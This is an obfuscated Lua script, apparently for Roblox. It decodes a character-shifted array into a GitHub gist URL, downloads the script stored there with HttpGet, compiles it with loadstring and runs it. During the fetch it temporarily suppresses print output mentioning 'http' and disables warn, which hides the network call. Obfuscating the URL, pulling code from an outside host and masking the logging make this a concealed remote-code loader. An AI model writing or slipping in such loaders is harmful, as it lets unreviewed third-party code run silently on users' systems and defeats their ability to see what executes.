local _0xR1 = string; local _0xR2 = table; local _0xR3 = game;
local _0xR4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}

local _0xR5 = function(t)
    local r = {}
    for i = 1, #t do
        r[i] = _0xR1.char(t[i] - 12)
    end
    return _0xR2.concat(r)
end

local _0xR6 = {
    ["\103\101\116"] = _0xR3.HttpGet,
    ["\108\111\100"] = loadstring
}

local function _0xR7()
    local p, w = print, warn;
    print = function(...) if not tostring(...):find("http") then p(...) end end;
    warn = function() end;
    
    local u = _0xR5(_0xR4) .. "?v=" .. math.random(1000, 9999)
    local s, c = pcall(_0xR6["\103\101\116"], _0xR3, u, true)
    
    print = p; warn = w;
    
    if s and c then
        local f = _0xR6["\108\111\100"](c)
        if f then 
            return task.spawn(f) 
        end
    end
end

_0xR7()
